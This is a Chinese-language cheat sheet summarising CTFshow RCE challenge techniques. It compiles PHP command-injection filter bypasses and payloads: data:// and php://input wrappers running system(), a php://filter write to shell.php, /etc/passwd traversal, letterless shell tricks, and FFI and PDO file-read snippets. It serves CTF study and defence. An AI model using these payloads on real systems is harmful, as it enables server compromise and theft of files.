# CTFshow RCE 命令执行 解题技巧总结
基于 CTFSHOW刷题之旅--命令执行[29-77,118-124](未更新完)

## 一、基础过滤绕过技巧

### 1.1 通配符绕过 (*)
- 作用：匹配任意字符序列
- 示例：`cat fla*` 匹配 `flag.php`
- 应用场景：过滤关键字如 flag、system 等

### 1.2 空格绕过方法
| 方法 | 说明 |
|------|------|
| `${IFS}` | Linux 环境变量，代表空格 |
| `$IFS$9` | $IFS + 第9个参数（通常为空） |
| `{IFS}`  | 花括号包裹 |
| `%09`    | URL 编码的 Tab 键 |
| `%0a`    | URL 编码的换行符 |
| `<>`     | 输入输出重定向符号 |
| `{cat,flag.php}` | 逗号替代空格（需要花括号） |

### 1.3 替代命令绕过
当特定命令被过滤时，使用功能相似的命令：
- `cat` → `more`, `less`, `tail`, `head`, `nl`, `tac`, `sort`
- 示例：`less flag.php`, `tail flag.php`, `nl flag.php`

### 1.4 特殊字符绕过
| 被过滤字符 | 绕过方法 |
|------------|----------|
| `;`        | `%0a` (换行), `%09` (Tab), `&&`, `||` |
| `&`        | `%0a`, `%09`, `;` |
| `|`        | `%0a`, `%09`, `;` |
| `(` `)`    | 使用变量或其他结构绕过 |
| `"` `'`    | 使用另一种引号或无引号（在特定上下文） |
| `.`        | URL 编码 `%2e`，但需注意 urldecode 时机 |

## 二、PHP 特性利用

### 2.1 PHP 短标签
- 标准 `<?php ... ?>` 被过滤时，可使用：
- `<?= ... ?>` （等价于 `<?php echo ... ?>`）
- 示例：`?c=data://text/plain,<?=%20system(%27cat%20fla*%27)%20?>`

### 2.2 可变函数
- 当函数名被过滤时，可使用变量存储函数名
- 示例：`$a='system'; $a('ls');`

### 2.3 伪协议利用
#### 2.3.1 php://input
- POST 数据直接作为代码执行（需 allow_url_include=On）
- 示例：`POST /?file=php://input` + `<?php system('ls');?>`

#### 2.3.2 php://filter
- 读取文件：`?file=php://filter/convert.base64-encode/resource=flag.php`
- 写入文件（绕过 die）：
  - `?file=php://filter/write=convert.base64-decode/resource=shell.php`
  - `content`: base64 编码的 PHP 代码

#### 2.3.3 data://
- 直接执行代码：`?file=data://text/plain,<?php system('ls');?>`
- Base64 编码：`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`

## 三、文件包含技巧

### 3.1 基本文件包含
- 当存在 `include($c)` 时，可直接包含文件
- 示例：`?c=data://text/plain,<?php echo `cat fla*`;?>`

### 3.2 文件名拼接绕过
- 当存在 `include($c.".php")` 时：
- 示例：`?c=data://text/plain,<?php%20echo%20`cat%20fla*`;%20?>`（前半段闭合，后半段 .php 无效）

### 3.4 目录遍历
- 使用 `../` 进行目录穿越（若未被过滤）
- 示例：`?c=../../../etc/passwd`

## 四、高级绕过技巧

### 4.1 无字母/数字 RCE
当字母和数字都被过滤时：
- 利用符号和变量构造命令
- 示例（web55）：`/???/????64%20????????` → `/bin/base64 -d`
- 利用 `$((...))` 进行算术运算和取反
- 示例（web57）：`$((~$(($((~$(())))$((~$(())))...))))` 通过多次取反得到特定数字

### 4.2 条件竞争 (Race Condition)
当同时存在文件上传和执行时：
- 上传临时文件（如 `/tmp/php********`）的同时执行它
- 需要多次尝试以赢得竞争
- 文件名通配符：`???/????????[@-[` 匹配 `/tmp/php[a-z][a-z][a-z][a-z][a-z][a-z]`

### 4.3 UAF (Use-After-Free) 利用
针对 PHP 7.x 的垃圾回收机制漏洞：
- 复杂的利用链涉及对象构造、内存泄漏、函数地址计算
- 最终调用 system() 函数执行命令
- 详见 web72 的完整利用代码

### 4.4 FFI (Foreign Function Interface) 利用
PHP 7.4+ 提供的 FFI 扩展：
- 直接调用系统函数如 system()
- 示例（web77）：
  ```php
  $ffi = FFI::cdef("int system(const char *command);");
  $a = '/readflag > 1.txt';
  $ffi->system($a);
  exit();
  ```

### 4.5 数据库函数利用
利用数据库扩展读取本地文件：
- 示例（web75-76）：
  ```php
  try {
      $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
      foreach($dbh->query('select load_file("/flag36.txt")') as $row){
          echo($row[0])."|";
      }
      $dbh = null;
  } catch (PDOException $e) {
      echo $e->getMessage();
  }
  exit(0);
  ```

## 五、特殊过滤场景

### 5.1 仅剩特殊字符时（web118）
当只能使用大写字母和特殊字符 `~?;:{}$` 时：
- 利用环境变量构造命令
- 示例：`${PATH:~A}${PWD:~A} ????.???`
  - `${PATH:~A}` 取 PATH 变量的最后一个字符
  - `${PWD:~A}` 取 PWD 变量的最后一个字符
  - `????.???` 使用通配符匹配目标文件

### 5.2 过滤引号和括号时
- 使用变量存储字符串
- 利用数组函数如 `current()`, `pos()`, `reset()`, `next()`, `array_reverse()`
- 示例（web40）：通过数组函数获取文件名然后用 `highlight_file()`

### 5.3 无回显命令执行
- 使用 `>/dev/null 2>&1` 隐藏输出
- 或利用时间盲注、DNS 外带、写入文件后访问等方式
- 示例：`system("命令 >/dev/null 2>&1")`

## 六、实战思路总结

### 6.1 信息收集阶段
1. 查看源码（如果可用）
2. 测试基本参数：`?c=1`, `?c=phpinfo()`, `?c=ls`
3. 观察错误信息，判断被过滤的内容
4. 确定可用字符和函数

### 6.2 漏洞利用步骤
1. **确定注入点**：GET/POST 参数、Cookie、Header 等
2. **测试基本执行**：尝试 `phpinfo()`、`ls` 等
3. **分析过滤规则**：根据错误信息总结被过滤的字符/关键字
4. **选择绕过策略**：
   - 关键字过滤 → 通配符、大小写、编码
   - 空格过滤 → `${IFS}`, `%09`, `<>`
   - 特殊命令过滤 → 替代命令（more/tail/tac/nl）
   - 引号括号过滤 → 变量函数、数组函数
   - 字母数字过滤 → 无字母/数字技巧、条件竞争
   - 文件包含场景 → 伪协议、短标签
5. **构造Payload**：组合多种绕过技巧
6. **获取结果**：直接回显、写入文件、DNS 外带等

### 6.3 常用Payload模板
- 基本命令执行：`?c=system('ls /');`
- 读取flag：`?c=system('cat /flag');`
- 文件包含：`?c=data://text/plain,<?php%20echo%20`cat%20fla*`;%20?>`
- 无字母数字：参考 web55, web57 等具体题解
- 高级利用：根据PHP版本选择 UAF、FFI 或数据库方法



### 7.2 渗透测试者技巧：
1. 多种绕过方法组合使用
2. 注意 URL 编码和 urldecode 的时机
3. 利用服务器特性（如 PHP 短标签、环境变量）
4. 尝试不同的编码方式（Base64、ROT13、十六进制等）
5. 关注错误信息中的线索

## 八、参考资料
- CTFSHOW官方平台: https://ctf.show
- 红队博客原文: https://redteam.cc/index.php/archives/634/
- PHP官方文档: https://www.php.net/
- OWASP代码执行防范指南

> 该技巧总结基于公开的CTFshow题目 writeup，仅用于技术学习和防御提升。请勿用于非法测试。